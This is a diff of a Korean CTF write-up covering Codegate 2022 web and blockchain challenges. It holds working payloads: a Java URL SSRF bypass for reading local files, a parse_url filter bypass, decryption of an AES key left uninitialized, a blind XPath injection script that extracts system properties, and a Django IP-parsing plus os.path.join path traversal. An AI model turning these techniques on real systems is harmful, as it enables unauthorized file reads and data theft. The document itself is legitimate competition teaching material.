@@ -1,115 +1,144 @@
 ---
-title: "Codegate 2022 Web & Blockchain Writeup"
-description: "Baby First(SSRF), Superbee(AES), MyBlog(XPath Injection), NFT 문제 풀이"
+title: "Codegate 2022 Web/Blockchain Writeup"
+description: "Codegate 2022 예선 Web 전체 문제 및 Blockchain(NFT) 문제 풀이"
 date: 2022-02-27
+tags: ["codegate", "ssrf", "xpath-injection", "aes", "blockchain"]
+ctf: "Codegate CTF 2022"
 published: true
-ctf: "Codegate 2022"
-category: "web"
-difficulty: "medium"
-tags: ["ssrf", "aes", "xpath-injection", "blockchain"]
 ---
 
-## 개요
+# Codegate 2022 Web(all)/Blockchain(nft) Write-up
 
-본선 못 갔으니 대충 쓰겠다.. 웹을 너무 빨리 풀어서 블체만 봤는데 개인적으로 블체에 대해 너무 몰라서 많이 아쉬운 감이 있었다 흑흑..
+본선 못갔으니 대충 쓰겠다..
+웹을 너무 빨리 풀어서 블체만 봤는데 개인적으로 블체에 대해 너무 몰라서 많이 아쉬운 감이 있었다 흑흑..
+nft 문제는 팀원인 epist가 도와줬다 (ㄳㄳ)
 
 ---
 
-## [Baby First] - SSRF
+## [Baby First]
 
-> 요약: SSRF로 regex 검사를 우회하여 local file을 leak한다
+### 요약: SSRF로 regex 검사를 우회하여 local file을 leak한다
 
 당연히 baby 붙어있길래 이거부터 봐서 그런지 **퍼스트 솔브**를 먹어버린 문제이다 ;;;
 
-### 취약점 분석
+대충 코드 보면 class 파일 내의 `lookupImg` 함수에서 memo의 내용 중 `[]` 대괄호 안에 들어가는걸 url로 받아 image를 파싱해서 img tag에 넣어준다.
 
 ```java
 pattern = Pattern.compile("^[a-z]+:");
 matcher = pattern.matcher(tmp);
-if (!matcher.find() || matcher.group().startsWith("file")) 
+if (!matcher.find() || matcher.group().startsWith("file"))
     return "";
 ```
 
-`java.net.URL`을 사용해서 넣어주는데, `startsWith` 함수로 `file:` 프로토콜 검사를 한다.
+이 때 `java.net.URL`을 사용해서 넣어주는데, 그 전에 `startsWith` 함수로 `file:` 프로토콜로 시작하는지 검사한다.
 
-### java.net.URL 분석
+`java.net.URL`을 auditing 해보면 `url:` 로 시작하면 start를 `+= 4` 해주는것을 볼 수 있다.
 
-[OpenJDK 소스](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.base/share/classes/java/net/URL.java#L575)를 보면 `url:` 로 시작하면 start를 += 4 해주는 것을 볼 수 있다.
-
-### Solution
-
+**Solution:**
 ```
 memo=[url:file:///flag]
 ```
 
 ---
 
-## [Superbee] - AES Uninitialized Key
+## [Second]
 
-> 요약: AES key가 초기화되지 않아 padding 값으로 복호화 가능
+### 요약: XSS bot에 admin password가 존재한다(언인텐), parse_url 버그를 이용한다(인텐)
 
-솔직히 대회하면서 이 문제가 왜 100점까지 털렸지라는 의문이 있었는데... 알고보니 계정이 `admin/password` 였다고 한다. (언인텐)
-
-### 취약점 분석
-
-```go
-func (this *AdminController) AuthKey() {
-    encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
-    this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
-}
+```php
+case 'iframe':
+    $src = $element->src;
+    $host = parse_url($src)['host'];
+    if (strpos($host, 'youtube.com') !== false) {
+        $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
+    }
+    break;
 ```
 
-`auth_crypt_key`가 선언만 되어있고 값을 불러오지 않는다!
+`parse_url($src)['host']`로 host 검사를 하는데, 이는 쉽게 우회가 가능하다.
+관련된 문서로는 오랜지 형님 자료가 참 좋다.
+
+### 언인텐
+
+```python
+# xss bot python code
+driver.get('http://3.39.55.38:1929/login')
+driver.find_element_by_id('id').send_keys('admin')
+driver.find_element_by_id('pw').send_keys('$MiLEYEN4')  ## ????
+driver.find_element_by_id('submit').click()
+```
+
+하튼 원래는 그런문제였지만 **xss bot에 패스워드가 들어있었다**.
+
+인텐으로는 대충 `javascript://youtube.com/[개행][코드]`로 하면 될거같다.
+
+---
+
+## [Third]
+
+### 요약: admin/password (언인텐), AES uninitialized key+padding it, iv from key decrypt
+
+난 솔직히 대회하면서 이문제가 왜 100점까지 털렸지라는 의문을 끝끝내 지울 수가 없었다.
+아 그런데 대회가 끝나고보니 계정이 **admin/password** 였다고한다. 으..;
+
+```bash
+$ nc 3.39.49.174 30001
+GET /admin/authkey HTTP/1.2
+Host: localhost
+
+HTTP/1.1 200 OK
+00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
+```
+
+일단 auth_key를 auth_secret_key로 AES CBC Encrypt해서 admin 페이지에 뿌려준다.
+host localhost로 검사하고있지만 걍 직접 nc로 붙어서 host 바꿔주니 뚝 떨어졌다.
+
+대충 코드 보면 암호화할때 쓰이는 `auth_crypt_key`가 **선언만 되어있고 값을 불러오지 않는다**.
 
 ```go
 func AesEncrypt(origData, key []byte) ([]byte, error) {
-    padded_key := Padding(key, 16)  // key가 빈 값이면 \x10*16
+    padded_key := Padding(key, 16)  // \x10*16
     block, err := aes.NewCipher(padded_key)
     // ...
     blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
-    // IV도 padded_key에서 가져옴
+    // ...
 }
 ```
 
-- Key: `\x10 * 16`
-- IV: `\x10 * 16`
+key와 iv가 모두 `\x10*16`이므로 복호화 가능!
 
-### Solution
-
-```python
-# 복호화 결과
+```
+$ python3 a.py
 b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
 ```
 
 ---
 
-## [MyBlog] - Blind XPath Injection
+## [Fourth]
 
-> 요약: blind xpath injection으로 catalina.properties에 설정된 environ variable leak
+### 요약: Blind XPath Injection으로 catalina.properties에 설정된 환경변수 leak
 
-### 취약점 발견 과정
+이제 jsp 문제 나오면 일단 톰캣, jdk부터 오디팅하는 습관이 들어져버렸다.
 
-JSP 문제 나오면 일단 톰캣, JDK부터 오디팅하는 습관이 들어져버렸다.
+대충 catalina.properties에 플래그 세팅해준거 보니 `System.getProperty` 같은 함수가 xpath 사용할 때 내부적으로 쓸거라 생각이 들어 ctrl+shift+f로 getProperty 검색해서 reference check를 했다.
 
-`catalina.properties`에 플래그 세팅해준 거 보니 `System.getProperty` 같은 함수가 xpath 사용할 때 내부적으로 쓸 거라 생각이 들었다.
+**XPath에서 system-property 함수 발견!**
 
-XPath function들 중에 `system-property`라는 좋은 함수가 있었다:
+```
+http://3.39.79.180/blog/read?idx=' or @idx=string-length(string-length(system-property('flag'))=46='true')-4 and @idx='1
+```
 
-1. [Keywords.java#L301](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/Keywords.java#L301)
-2. [FunctionTable.java#L224](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/FunctionTable.java#L224)
-3. [FuncSystemProperty.java#L101](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/functions/FuncSystemProperty.java#L101)
-
-### Exploit
+대충 blind xpath injection 구문 짜서 length check하고:
 
 ```python
 from arang import *
 
 s = requests.session()
 headers = {"Cookie": "JSESSIONID=C37A435A55859F879AC71B4ECE966C07"}
+s.headers = headers
 
 flag = "codegate2022{"
-
-for i in range(len(flag)+1, 47):
+for i in range(len(flag)+1, 46+1):
     for c in "0123456789abcdef}":
         url = f"http://3.39.79.180/blog/read?idx=' or @idx=string-length(substring(system-property('flag'),{i},1)='{c}'='true')-4 and @idx='1"
         r = s.get(url)
@@ -121,8 +150,49 @@ for i in range(len(flag)+1, 47):
 
 ---
 
-## 배운 점
+## [NFT] Blockchain
 
-- Java URL 파서의 특이한 동작 (`url:` prefix)
-- Go에서 초기화되지 않은 변수의 위험성
-- XPath의 `system-property` 함수로 시스템 속성 접근 가능
+### 요약: Blockchain이지만 webchall, 1day랑 python trick 이용
+
+```solidity
+modifier contains (string memory what, string memory where) {
+    bytes memory whatBytes = bytes (what);
+    bytes memory whereBytes = bytes (where);
+    require(whereBytes.length >= whatBytes.length);
+    // ... 엉성한 contains 구현
+}
+```
+
+contains 함수가 좀 엉성하다.
+
+**requirements.txt:** Django==3.2.1
+
+**CVE-2021-33571** 발견!
+
+```python
+>>> ipaddress.IPv4Address("127.0.0.01")
+IPv4Address('127.0.0.1')
+```
+
+이제 `127.00.0.1` 주면 contains 우회할 수 있다.
+
+**os.path.join 트릭:**
+
+```python
+>>> uri = "1.1.1.1/account/storages//a.b.c"
+>>> nft_file = uri.split(nft_path + '/')[-1]
+>>> nft_file
+'/a.b.c'
+>>> path = os.path.join(os.getcwd(), nft_path, nft_file)
+>>> path
+'/a.b.c'
+```
+
+`os.path.join` 쓸 때 세번째 인자 절대경로 주면 절대경로로 바뀌어버리는 trick!
+
+**Payload:**
+```
+127.00.0.1/account/storages//home/ctf/flag.txt
+```
+
+취약점은 찾았으나 블체 눕눕이라 실제 익스를 못해서 팀원인 epist가 대신 익스해줬다 (ㄳㄳ)
